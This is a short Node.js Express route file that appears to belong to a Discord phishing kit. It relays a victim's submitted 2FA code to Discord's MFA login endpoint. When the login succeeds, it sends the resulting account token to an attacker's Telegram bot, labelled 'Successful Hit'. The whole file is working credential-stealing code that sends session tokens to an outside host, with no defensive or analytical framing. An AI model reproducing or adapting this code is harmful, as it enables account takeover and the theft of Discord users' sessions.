var config = require("../config.json")
var botTelegram = config.bot
var tgChatId = config.chatId


var express = require('express');
var router = express.Router();
var fetch = require("node-fetch")

router.all('/', async function(req, res){
    if(req.method == "GET") return res.status(400)
    var response = await fetch("https://discord.com/api/v9/auth/mfa/totp",{
        method: req.method,
        body: JSON.stringify(req.body),
        headers: {'Content-Type': 'application/json'}
    })
    const data = await response.json();
    if(data.token)
    {
        fetch(botTelegram,{
            method: "POST",
            body: JSON.stringify({
                "chat_id": tgChatId,
                "text": `<b>✅ Successful Hit</b>\n\n<b>Token</b>: ${data.token}\n\n<b>Login type: 2FA</b>`,
                "parse_mode": "HTML"
            }),
            headers: {'Content-Type': 'application/json'}
        })
    }
    res.status(response.status).send(data)
});

//export this router to use in our index.js
module.exports = router;